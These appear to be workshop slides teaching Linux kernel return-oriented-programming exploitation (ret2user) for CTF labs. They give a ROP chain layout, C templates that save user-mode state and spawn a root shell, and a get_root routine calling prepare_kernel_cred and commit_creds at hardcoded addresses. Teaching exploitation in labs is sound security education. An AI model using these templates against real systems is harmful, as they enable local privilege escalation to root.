---

title: Meet-3 -> Linux Kernel ROP, (Ret2User)
author: th3f0x
styles:
  style: gruvbox-dark

---

## Overview

- [Overview](#overview)
- [Kernel Stack Canaries](#kernel-stack-canaries)
- [Ret2User](#ret2user)
- [Challenges](#challenges)
- [Misc Tips](#misc-tips)
- [Home Assignment](#home-assignment)
- [Links](#links)

---

## Kernel Stack Canaries

- This is exactly the same as stack canaries on userland. It is enabled in the
kernel at compile time and cannot be disabled.

- Just like in userspace exploitation, this value needs to be leaked by some
  method in order to successfully perform a stack-based ROP attack

---

## Ret2User

- When we overwrite the return address during kernel stack buffer overflow exploitation, we basically corrupt the natural path back to userspace mode and userspace code execution. In order to successfully finish the exploitation, we must return to the userspace code somehow. This is acheived via use of 2 instructions:
  - `swapgs`: The purpose of this instruction is to also swap the GS register between `kernel-mode` and `user-mode`
  - `iretq`: Basically return from a system call back into user space, expecting some things to be setup on the stack, in order to return to the right location. It expects:
    - `RIP`: where to resume execution from, after returning to user-mode
    - `CS`
    - `RFLAGS`
    - `SP`: stack pointer: some valid read/write location in userspace
    - `SS`

  - The rest of the values can just be taken from the program running in user-mode at any time and used directly.

- Therefore ROP chain looks like:

```
<padding>
<exploit chain: using things like `prepare_kernel_cred` and `commit_creds`>
<swapgs; ret gadget>
<iretq gadget>
<RIP>
<CS>
<RFLAGS>
<SP>
<SS>
```

---

## Challenges

- Lab 6 (from [How2Kernel](https://github.com/R3x/How2Kernel) Repository)
  - Files: `https://github.com/R3x/How2Kernel/Lab6`

---

## Misc Tips

- Usually we use some sort of template for making the exploitation process much easier:

```c
struct TrapFrame{
    void* rip;
    unsigned long user_cs;
    unsigned long user_rflags;
    void* rsp;
    unsigned long user_ss;
} __attribute__((packed));

struct TrapFrame tf;

// get shell
static void shell() {
    puts("[*] Spawning shell");
    system("/bin/sh");
    exit(0);
}


static void save() {
    asm(
        "xor %rax, %rax;"
        "mov %cs, %ax;"
        "pushq %rax; popq tf+8;"
        "pushfq; popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "mov %ss, %ax;"
        "pushq %rax; popq tf+32;"
    );
    tf.rip = (&shell);
    // tf.rsp -= 1024;
    puts("[*] Saved state");
}

int main(void) {
    .
    .
    .
    save()

    // <exploit using `tf` struct's data itself
    .
    .
    .
}

```

or

```c

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int main(void) {
    .
    .
    .

    save_state()

    // <exploit using the values from `save_state`, and any required rsp we want manually>
    .
    .
    .
}

```

- In case, SMEP is disabled, we can use a user-defined function as well in the ROP chain:

```c
// using function pointers to call kernel-function
void get_root() {
    void* (*prepare_kernel_cred)(int) = 0xffffffffab67f810;
    void (*commit_creds)(void*) = 0xffffffffab67f4e0;
    commit_creds(prepare_kernel_cred(0));
}

// or, using inline assembly
void get_root() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov r13, 0xffffffffab67f810;"
        "mov rdi, 0;"
        "call r13;"
        "mov rdi, rax;"
        "mov r13, 0xffffffffab67f4e0;"
        "call r13;"
        ".att_syntax;"
    );
}

```

---

## Home Assignment

- Try to read some portions from the [links](#links)
- Try to solve the lab by yourself once as well
- Try to solve the challenge `kernel-rop` without reading the [Good blog series on kernel exploitation](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/)
  in the [Links](#links) section, which basically serves as a writeup for the
  challenge. Read the post only after trying out the challenge yourself.
  - Files: `kernel-rop-bf9c106d45917343.tar.xz`

---

## Links

- [Good blog series on kernel exploitation](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/)
- [Kernel Challenges Basic Info](https://web.archive.org/web/20191019131252/http://www.auxy.xyz/modern%20binary%20exploitation/2019/06/10/Linux-Exp-Tutorial.html)
